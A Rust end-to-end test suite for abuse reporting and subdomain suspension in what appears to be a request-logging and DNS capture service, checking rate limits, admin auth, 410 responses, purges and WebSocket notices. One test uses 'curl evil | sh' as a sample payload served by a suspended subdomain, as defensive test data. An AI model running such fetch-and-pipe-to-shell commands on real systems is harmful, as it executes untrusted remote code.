//! End-to-end tests for abuse reporting and suspension, over a real HTTP server, its
//! WebSocket, and the DNS query handler.

#[cfg(test)]
mod tests {
    use crate::abuse::Settings;
    use crate::tests::harness::{
        admin_settings, http, websocket, ws_recv, ws_send, Reply, TestServer, ADMIN, JSON,
    };
    use crate::utils::config::CONFIG;
    use crate::utils::{generate_jwt, get_random_subdomain};
    use serde_json::json;
    use std::sync::Arc;
    use tokio::sync::broadcast;

    const REASON: &str = "Loader beacons here before dropping a miner";
    const REPORTS: &str = "/api/v2/abuse/reports";
    const ADMIN_API: &str = "/api/v2/abuse/admin/subdomains";

    fn report_body(subdomain: &str) -> String {
        json!({ "subdomain": subdomain, "category": "malware", "reason": REASON }).to_string()
    }

    impl TestServer {
        async fn report(&self, subdomain: &str) -> Reply {
            self.request(
                "POST",
                &self.main_host(),
                REPORTS,
                JSON,
                &report_body(subdomain),
            )
            .await
        }

        async fn suspend(&self, subdomain: &str) -> Reply {
            self.admin(
                "PUT",
                &format!("{ADMIN_API}/{subdomain}"),
                r#"{"category": "phishing"}"#,
            )
            .await
        }

        async fn logged(&self, subdomain: &str) -> usize {
            self.cache
                .llen(&format!("requests:{subdomain}"))
                .await
                .unwrap()
        }
    }

    // --- Reporting ---------------------------------------------------------

    #[tokio::test]
    async fn policy_describes_reporting_on_this_instance() {
        let server = TestServer::start(Settings::default()).await;
        let policy = server.main("GET", "/api/v2/abuse", &[]).await;
        assert_eq!(policy.status, 200);
        let policy = policy.json();
        assert_eq!(policy["reporting_enabled"], true);
        assert_eq!(policy["rate_limit"]["reports"], 3);
        assert_eq!(policy["categories"][0], "malware");
    }

    #[tokio::test]
    async fn a_report_suspends_at_once() {
        let server = TestServer::start(admin_settings()).await;
        let label = get_random_subdomain();
        let host = server.subdomain_host(&label);
        assert_eq!(server.request("GET", &host, "/", &[], "").await.status, 200);

        let reply = server.report(&label).await;
        assert_eq!(reply.status, 201, "{}", reply.body);
        let body = reply.json();
        assert_eq!(body["subdomain"], label.as_str());
        assert_eq!(body["suspended"], true);
        assert_eq!(body["already_suspended"], false);
        assert_eq!(server.request("GET", &host, "/", &[], "").await.status, 410);

        // Reporting it again is fine, and says so
        let again = server.report(&label).await;
        assert_eq!(again.status, 200);
        assert_eq!(again.json()["already_suspended"], true);

        let entry = server
            .admin("GET", &format!("{ADMIN_API}/{label}"), "")
            .await
            .json();
        assert_eq!(entry["source"], "report");
        assert_eq!(entry["report_count"], 2);
        assert_eq!(entry["reports"][0]["reason"], REASON);
        assert_eq!(entry["reports"][0]["network"], "127.0.0.0/24");
    }

    #[tokio::test]
    async fn report_accepts_a_url_or_nested_name_and_rejects_bad_input_for_free() {
        let server = TestServer::start(Settings::default()).await;
        let label = get_random_subdomain();
        let host = server.subdomain_host(&label);

        let as_url = json!({
            "subdomain": format!("http://x.{host}/bottom-xe.png"),
            "category": "malware",
        })
        .to_string();
        let reply = server
            .request("POST", &server.main_host(), REPORTS, JSON, &as_url)
            .await;
        assert_eq!(reply.status, 201, "{}", reply.body);
        assert_eq!(reply.json()["subdomain"], label.as_str());

        // Each of these is refused with a JSON error, and none of them costs an attempt
        let bad_input = [
            (
                json!({ "subdomain": "not-a-label", "category": "malware" }),
                "invalid_subdomain",
            ),
            (
                json!({ "subdomain": "abcdefgh.example.org", "category": "malware" }),
                "invalid_subdomain",
            ),
            (
                json!({ "subdomain": "abcdefgh", "category": "malware", "reason": "x".repeat(301) }),
                "invalid_reason",
            ),
            (
                json!({ "subdomain": "abcdefgh", "category": "nonsense" }),
                "invalid_body",
            ),
            // Nowhere to put a link or contact details
            (
                json!({ "subdomain": "abcdefgh", "category": "malware", "contact": "me" }),
                "invalid_body",
            ),
            (
                json!({ "subdomain": "abcdefgh", "category": "malware", "evidence_url": "https://x" }),
                "invalid_body",
            ),
        ];
        for (body, code) in bad_input {
            let reply = server
                .request(
                    "POST",
                    &server.main_host(),
                    REPORTS,
                    JSON,
                    &body.to_string(),
                )
                .await;
            assert_eq!(reply.status, 400, "{body}: {}", reply.body);
            assert_eq!(reply.code(), code, "{body}");
        }

        // Two more reports fit in the budget of three
        for _ in 0..2 {
            assert_eq!(server.report(&get_random_subdomain()).await.status, 201);
        }

        let limited = server.report(&get_random_subdomain()).await;
        assert_eq!(limited.status, 429);
        assert_eq!(limited.code(), "rate_limited");
        let retry_after: u64 = limited.header("retry-after").unwrap().parse().unwrap();
        assert!((3595..=3600).contains(&retry_after), "{retry_after}");
        assert_eq!(server.abuse.blocked_count(), 3);
    }

    #[tokio::test]
    async fn report_demands_a_small_json_body() {
        let server = TestServer::start(Settings::default()).await;

        // `text/plain` is what a cross-site form could send without a CORS preflight
        let not_json = server
            .request(
                "POST",
                &server.main_host(),
                REPORTS,
                &[("Content-Type", "text/plain")],
                &report_body(&get_random_subdomain()),
            )
            .await;
        assert_eq!(not_json.status, 415);
        assert_eq!(not_json.code(), "unsupported_media_type");

        let oversized = "x".repeat(4 * 1024 + 1);
        let too_big = server
            .request("POST", &server.main_host(), REPORTS, JSON, &oversized)
            .await;
        assert_eq!(too_big.status, 413);

        assert_eq!(server.abuse.blocked_count(), 0);
    }

    #[tokio::test]
    async fn concurrent_reports_cannot_exceed_the_rate_limit() {
        let server = TestServer::start(Settings::default()).await;

        let mut tasks = Vec::new();
        for _ in 0..24 {
            let body = report_body(&get_random_subdomain());
            let (addr, host) = (server.addr, server.main_host());
            tasks.push(tokio::spawn(async move {
                http(addr, "POST", &host, REPORTS, JSON, &body).await.status
            }));
        }
        let mut statuses = Vec::new();
        for task in tasks {
            statuses.push(task.await.unwrap());
        }

        assert_eq!(statuses.iter().filter(|status| **status == 201).count(), 3);
        assert_eq!(statuses.iter().filter(|status| **status == 429).count(), 21);
        assert_eq!(server.abuse.blocked_count(), 3);
    }

    #[tokio::test]
    async fn reporting_can_be_switched_off() {
        let server = TestServer::start(Settings {
            reporting_enabled: false,
            ..Settings::default()
        })
        .await;

        let reply = server.report(&get_random_subdomain()).await;
        assert_eq!(reply.status, 404);
        assert_eq!(reply.code(), "reporting_disabled");
    }

    #[tokio::test]
    async fn report_endpoint_answers_without_cors_headers() {
        let server = TestServer::start(Settings::default()).await;
        let reply = server.report(&get_random_subdomain()).await;

        assert_eq!(reply.status, 201);
        // Other API routes send these; the public report route must not, or any site could
        // make its visitors file reports
        assert_eq!(reply.header("access-control-allow-origin"), None);
    }

    // --- Admin -------------------------------------------------------------

    #[tokio::test]
    async fn admin_api_needs_its_own_token() {
        let unconfigured = TestServer::start(Settings::default()).await;
        let reply = unconfigured.admin("GET", ADMIN_API, "").await;
        assert_eq!(reply.status, 403);
        assert_eq!(reply.code(), "admin_not_configured");

        let server = TestServer::start(admin_settings()).await;
        let wrong = server.api("wrong-token", "GET", ADMIN_API, "").await;
        assert_eq!(wrong.status, 401);
        assert_eq!(wrong.code(), "invalid_admin_token");

        // A cookie is not accepted: only an explicit header
        let cookie = format!("admin_token={ADMIN}");
        let with_cookie = server
            .main("GET", ADMIN_API, &[("Cookie", cookie.as_str())])
            .await;
        assert_eq!(with_cookie.status, 401);

        // Every admin route checks it
        let label = get_random_subdomain();
        for (method, target) in [
            ("GET", format!("{ADMIN_API}/{label}")),
            ("PUT", format!("{ADMIN_API}/{label}")),
            ("DELETE", format!("{ADMIN_API}/{label}")),
            ("GET", format!("{ADMIN_API}/{label}/requests")),
            ("GET", format!("{ADMIN_API}/{label}/sources")),
            ("DELETE", format!("{ADMIN_API}/{label}/data")),
        ] {
            let reply = server.api("wrong-token", method, &target, "").await;
            assert_eq!(reply.status, 401, "{method} {target}");
        }
        assert!(!server.abuse.is_blocked(&label));

        assert_eq!(server.admin("GET", ADMIN_API, "").await.status, 200);
    }

    #[tokio::test]
    async fn admin_suspends_lists_updates_and_lifts() {
        let server = TestServer::start(admin_settings()).await;
        let label = get_random_subdomain();
        let entry = format!("{ADMIN_API}/{label}");
        let host = server.subdomain_host(&label);

        // No body needed
        let suspended = server.admin("PUT", &entry, "").await;
        assert_eq!(suspended.status, 201, "{}", suspended.body);
        assert_eq!(suspended.json()["entry"]["source"], "admin");
        assert_eq!(suspended.json()["entry"]["category"], "other");
        assert_eq!(server.request("GET", &host, "/", &[], "").await.status, 410);

        // Suspending again updates the reason
        let updated = server
            .admin("PUT", &entry, r#"{"category": "phishing", "note": "Kit"}"#)
            .await;
        assert_eq!(updated.status, 200);
        assert_eq!(updated.json()["already_suspended"], true);
        assert_eq!(updated.json()["entry"]["category"], "phishing");
        assert_eq!(updated.json()["entry"]["admin_note"], "Kit");

        let listed = server
            .admin("GET", &format!("{ADMIN_API}?q={}", &label[..4]), "")
            .await
            .json();
        assert_eq!(listed["subdomains"][0]["subdomain"], label.as_str());
        assert_eq!(listed["pagination"]["total"], 1);

        // Lifting restores it, and the list persists across a restart
        assert_eq!(server.admin("DELETE", &entry, "").await.status, 200);
        assert_eq!(server.request("GET", &host, "/", &[], "").await.status, 200);
        let lifted_again = server.admin("DELETE", &entry, "").await;
        assert_eq!(lifted_again.status, 404);
        assert_eq!(lifted_again.code(), "not_suspended");

        server.suspend(&label).await;
        let reloaded = crate::abuse::AbuseList::load(server.data_dir.path(), admin_settings())
            .await
            .unwrap();
        assert!(reloaded.is_blocked(&label));
    }

    // --- What the owner and the world see ----------------------------------

    #[tokio::test]
    async fn suspended_traffic_gets_410_and_is_recorded_for_the_admin_only() {
        let server = TestServer::start(admin_settings()).await;
        let label = get_random_subdomain();
        let host = server.subdomain_host(&label);
        let token = generate_jwt(&label).unwrap();

        // The owner serves a payload
        let put = server
            .api(
                &token,
                "PUT",
                "/api/v2/files/loader.sh",
                r#"{"body": "curl evil | sh"}"#,
            )
            .await;
        assert_eq!(put.status, 201, "{}", put.body);
        assert_eq!(
            server
                .request("GET", &host, "/loader.sh", &[], "")
                .await
                .body,
            "curl evil | sh"
        );
        server.suspend(&label).await;

        for (method, path, body) in [
            ("GET", "/loader.sh", ""),
            (
                "POST",
                "/beacon?host=victim-1",
                "{\"hostname\": \"victim-1\"}",
            ),
            ("GET", "/api/v2/files", ""),
        ] {
            let reply = server
                .request(
                    method,
                    &host,
                    path,
                    &[("Content-Type", "application/json")],
                    body,
                )
                .await;
            assert_eq!(reply.status, 410, "{method} {path}");
            assert!(!reply.body.contains("curl evil"), "nothing is served");
            assert_eq!(reply.header("cache-control"), Some("no-store"));
            assert!(reply.body.starts_with("410 Gone"), "plain text for clients");
        }

        // A browser gets a page saying what happened
        let browser = server
            .request(
                "GET",
                &host,
                "/",
                &[("Accept", "text/html,application/xhtml+xml,*/*;q=0.8")],
                "",
            )
            .await;
        assert_eq!(browser.status, 410);
        assert_eq!(
            browser.header("content-type"),
            Some("text/html; charset=utf-8")
        );
        assert!(browser.body.contains("This subdomain has been suspended"));

        // Path-based routing on the main domain is answered the same way
        let by_path = server
            .main("GET", &format!("/r/{label}/loader.sh"), &[])
            .await;
        assert_eq!(by_path.status, 410);

        // ...but every hit was recorded, body included, for the admin
        let captured = server
            .admin("GET", &format!("{ADMIN_API}/{label}/requests"), "")
            .await
            .json();
        let beacon = captured["requests"]
            .as_array()
            .unwrap()
            .iter()
            .find(|r| r["path"] == "/beacon")
            .cloned()
            .expect("the beacon was recorded");
        assert_eq!(beacon["query"], "?host=victim-1");
        assert_eq!(beacon["raw"], "eyJob3N0bmFtZSI6ICJ2aWN0aW0tMSJ9");

        let sources = server
            .admin("GET", &format!("{ADMIN_API}/{label}/sources"), "")
            .await
            .json();
        assert_eq!(sources["unique_sources"], 1);
        assert_eq!(sources["sources"][0]["ip"], "127.0.0.1");

        // The owner cannot read them
        let owner = server.api(&token, "GET", "/api/v2/requests", "").await;
        assert_eq!(owner.status, 403);
        assert_eq!(owner.code(), "subdomain_suspended");
    }

    #[tokio::test]
    async fn owner_loses_access_while_suspended_and_recovers_when_lifted() {
        let server = TestServer::start(admin_settings()).await;
        let label = get_random_subdomain();
        let other = get_random_subdomain();
        let token = generate_jwt(&label).unwrap();

        // A shared request link made before the suspension
        server
            .cache
            .rpush(
                &format!("requests:{label}"),
                &json!({ "_id": "req-1", "type": "http", "raw": "", "uid": label }).to_string(),
            )
            .await
            .unwrap();
        // No body on purpose: this endpoint reads none, and a body arriving after the
        // server closed the connection would turn the close into a reset.
        let shared = server
            .api(&token, "POST", "/api/v2/requests/req-1/share", "")
            .await;
        assert_eq!(shared.status, 201);
        let share_target = format!(
            "/api/v2/requests/shared/{}",
            shared.json()["share_token"].as_str().unwrap()
        );
        assert_eq!(server.main("GET", &share_target, &[]).await.status, 200);

        server.report(&label).await;

        // Bodies are valid, so each request is refused by the suspension and not by a body
        // parser that runs first
        for (method, target, body) in [
            ("GET", "/api/v2/files", ""),
            ("PUT", "/api/v2/files", "{}"),
            ("PUT", "/api/v2/files/x", r#"{"body": "x"}"#),
            ("DELETE", "/api/v2/files/x", ""),
            ("GET", "/api/v2/dns", ""),
            ("PUT", "/api/v2/dns", r#"{"records":[]}"#),
            ("GET", "/api/v2/requests", ""),
            ("GET", "/api/v2/requests?wait=5", ""),
            ("DELETE", "/api/v2/requests", ""),
            ("GET", "/api/v2/requests/req-1", ""),
            ("DELETE", "/api/v2/requests/req-1", ""),
        ] {
            let reply = server.api(&token, method, target, body).await;
            assert_eq!(reply.status, 403, "{method} {target}: {}", reply.body);
            // "Suspended", deliberately not "invalid token": the dashboard drops sessions
            // whose token it considers invalid
            assert_eq!(reply.code(), "subdomain_suspended");
            assert_eq!(reply.json()["category"], "malware");
        }
        let link = server.main("GET", &share_target, &[]).await;
        assert_eq!(link.status, 403);
        assert_eq!(link.code(), "subdomain_suspended");

        // A new session is not affected, and never gets a suspended name
        let other_token = generate_jwt(&other).unwrap();
        assert_eq!(
            server
                .api(&other_token, "GET", "/api/v2/files", "")
                .await
                .status,
            200
        );

        // The same token works again once lifted
        server
            .admin("DELETE", &format!("{ADMIN_API}/{label}"), "")
            .await;
        assert_eq!(
            server.api(&token, "GET", "/api/v2/files", "").await.status,
            200
        );
    }

    #[tokio::test]
    async fn a_long_poll_stops_when_its_session_is_suspended() {
        let server = TestServer::start(admin_settings()).await;
        let label = get_random_subdomain();
        let host = server.subdomain_host(&label);
        let token = generate_jwt(&label).unwrap();

        let poll = {
            let authorization = format!("Bearer {token}");
            let (addr, main_host) = (server.addr, server.main_host());
            tokio::spawn(async move {
                http(
                    addr,
                    "GET",
                    &main_host,
                    "/api/v2/requests?wait=20",
                    &[("Authorization", authorization.as_str())],
                    "",
                )
                .await
            })
        };
        tokio::time::sleep(std::time::Duration::from_millis(300)).await;
        server.suspend(&label).await;
        // A victim's request arrives: it must not reach the waiting owner
        server.request("GET", &host, "/victim", &[], "").await;

        let reply = tokio::time::timeout(std::time::Duration::from_secs(5), poll)
            .await
            .unwrap()
            .unwrap();
        assert_eq!(reply.status, 403, "{}", reply.body);
        assert!(!reply.body.contains("/victim"));
    }

    #[tokio::test]
    async fn purge_removes_files_dns_records_and_requests() {
        let server = TestServer::start(admin_settings()).await;
        let label = get_random_subdomain();
        let token = generate_jwt(&label).unwrap();

        let dns = json!({ "records": [
            { "domain": "www", "type": "A", "value": "6.6.6.6" },
            { "domain": "*", "type": "TXT", "value": "data" },
        ]})
        .to_string();
        assert_eq!(
            server.api(&token, "PUT", "/api/v2/dns", &dns).await.status,
            200
        );
        // Fetching the files creates the default file tree, as it does for a new session
        server.api(&token, "GET", "/api/v2/files", "").await;
        server
            .request("GET", &server.subdomain_host(&label), "/x", &[], "")
            .await;
        server.suspend(&label).await;

        let purged = server
            .admin("DELETE", &format!("{ADMIN_API}/{label}/data"), "")
            .await;
        assert_eq!(purged.status, 200);

        for key in [
            format!("files:{label}"),
            format!("dns:{label}"),
            format!("dns:A:www.{label}.{}.", CONFIG.server_domain),
            format!("dns:TXT:*.{label}.{}.", CONFIG.server_domain),
        ] {
            assert_eq!(server.cache.get(&key).await.unwrap(), None, "{key}");
        }
        assert_eq!(server.logged(&label).await, 0);
        // Purging does not lift the suspension
        assert!(server.abuse.is_blocked(&label));
    }

    #[tokio::test]
    async fn admin_traffic_views_are_limited_to_suspended_subdomains() {
        let server = TestServer::start(admin_settings()).await;
        let other = get_random_subdomain();
        for view in ["requests", "sources"] {
            let reply = server
                .admin("GET", &format!("{ADMIN_API}/{other}/{view}"), "")
                .await;
            assert_eq!(reply.status, 404, "{view}");
            assert_eq!(reply.code(), "not_suspended");
        }
    }

    #[tokio::test]
    async fn health_reports_the_blocklist() {
        let server = TestServer::start(Settings::default()).await;
        let before = server.main("GET", "/health", &[]).await.json();
        assert_eq!(before["abuse"]["suspended"], 0);
        assert_eq!(before["abuse"]["persist_failures"], 0);

        server.report(&get_random_subdomain()).await;
        let after = server.main("GET", "/health", &[]).await.json();
        assert_eq!(after["abuse"]["suspended"], 1);
    }

    // --- WebSocket ---------------------------------------------------------

    #[tokio::test]
    async fn websocket_refuses_a_suspended_token_with_its_own_code() {
        let server = TestServer::start(admin_settings()).await;
        let label = get_random_subdomain();
        let other = get_random_subdomain();
        server.suspend(&label).await;

        let mut socket = websocket(server.addr, &server.main_host()).await;

        ws_send(
            &mut socket,
            &json!({ "cmd": "connect", "token": generate_jwt(&label).unwrap() }).to_string(),
        )
        .await;
        let refused = ws_recv(&mut socket).await;
        assert_eq!(refused["cmd"], "error");
        // Must not be `invalid_token`: the dashboard deletes sessions with an invalid token
        assert_eq!(refused["code"], "subdomain_suspended");
        assert_eq!(refused["subdomain"], label.as_str());
        assert_eq!(refused["category"], "phishing");

        ws_send(
            &mut socket,
            &json!({ "cmd": "connect", "token": generate_jwt(&other).unwrap() }).to_string(),
        )
        .await;
        assert_eq!(ws_recv(&mut socket).await["cmd"], "connected");

        // Tokens that really are invalid are still reported that way
        ws_send(
            &mut socket,
            &json!({ "cmd": "connect", "token": "garbage" }).to_string(),
        )
        .await;
        assert_eq!(ws_recv(&mut socket).await["code"], "invalid_token");
    }

    #[tokio::test]
    async fn a_connected_dashboard_is_told_and_then_hears_nothing_more() {
        let server = TestServer::start(Settings::default()).await;
        let label = get_random_subdomain();
        let host = server.subdomain_host(&label);

        let mut socket = websocket(server.addr, &server.main_host()).await;
        ws_send(
            &mut socket,
            &json!({ "cmd": "connect", "token": generate_jwt(&label).unwrap() }).to_string(),
        )
        .await;
        assert_eq!(ws_recv(&mut socket).await["cmd"], "connected");

        assert_eq!(server.report(&label).await.status, 201);
        let notice = ws_recv(&mut socket).await;
        assert_eq!(notice["cmd"], "suspended");
        assert_eq!(notice["subdomain"], label.as_str());
        assert_eq!(notice["category"], "malware");

        // Traffic after the suspension is recorded but never pushed to the owner
        server.request("GET", &host, "/after", &[], "").await;
        assert_eq!(server.logged(&label).await, 1);
        ws_send(&mut socket, r#"{"cmd": "ping"}"#).await;
        let next = ws_recv(&mut socket).await;
        assert_eq!(next["cmd"], "pong", "got {next} instead");
    }

    // --- DNS ---------------------------------------------------------------

    async fn dns_query(
        server: &TestServer,
        name: &str,
    ) -> (hickory_proto::op::ResponseCode, usize) {
        use hickory_proto::op::{Message, MessageType, OpCode, Query};
        use hickory_proto::rr::{Name, RecordType};
        use hickory_proto::serialize::binary::{BinDecodable, BinEncodable};
        use std::str::FromStr;

        let mut query = Message::new(0x1234, MessageType::Query, OpCode::Query);
        let mut question = Query::new();
        question.set_name(Name::from_str(name).unwrap());
        question.set_query_type(RecordType::A);
        query.add_query(question);

        let (tx, _) = broadcast::channel(16);
        let bytes = crate::dns::process_dns_query(
            &query.to_bytes().unwrap(),
            "127.0.0.1:5353".parse().unwrap(),
            server.cache.clone(),
            Arc::new(tx),
            server.abuse.clone(),
            false,
        )
        .await
        .unwrap();
        let response = Message::from_bytes(&bytes).unwrap();
        (response.metadata.response_code, response.answers.len())
    }

    #[tokio::test]
    async fn dns_treats_a_suspended_subdomain_as_nonexistent_but_records_queries() {
        use hickory_proto::op::ResponseCode;

        let server = TestServer::start(admin_settings()).await;
        let label = get_random_subdomain();
        let name = format!("{}.{}.", label, CONFIG.server_domain);
        let nested = format!("data.{}.", name.trim_end_matches('.'));

        assert_eq!(
            dns_query(&server, &name).await,
            (ResponseCode::NoError, 1),
            "answers with the server address before the suspension"
        );
        assert_eq!(server.logged(&label).await, 1);

        server.suspend(&label).await;

        for suspended in [&name, &nested] {
            let (code, answers) = dns_query(&server, suspended).await;
            assert_eq!(code, ResponseCode::NXDomain, "{suspended}");
            assert_eq!(answers, 0, "{suspended}");
        }
        // Recorded for the admin, with what was answered
        assert_eq!(server.logged(&label).await, 3);
        let captured = server
            .admin("GET", &format!("{ADMIN_API}/{label}/requests"), "")
            .await
            .json();
        let last = &captured["requests"][2];
        assert_eq!(last["type"], "dns");
        assert_eq!(last["reply"], "NXDOMAIN (subdomain suspended)");

        let other = get_random_subdomain();
        assert_eq!(
            dns_query(&server, &format!("{other}.{}.", CONFIG.server_domain)).await,
            (ResponseCode::NoError, 1)
        );
    }
}
